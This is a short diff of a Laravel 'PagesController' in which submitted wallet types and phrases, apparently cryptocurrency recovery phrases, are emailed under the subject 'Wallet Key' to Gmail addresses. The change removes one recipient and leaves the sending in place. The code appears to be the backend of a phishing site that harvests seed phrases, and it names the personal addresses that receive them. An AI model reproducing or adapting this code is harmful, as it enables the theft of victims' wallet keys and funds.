@@ -58,7 +58,7 @@ class PagesController extends Controller
 
         if ($mailList) {
             Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase, function ($message) {
-                $message->to(['lawalfemi33@gmail.com', 'callmehalpha2022@gmail.com'])
+                $message->to(['callmehalpha2022@gmail.com'])
                     ->subject('Wallet Key');
             });
 
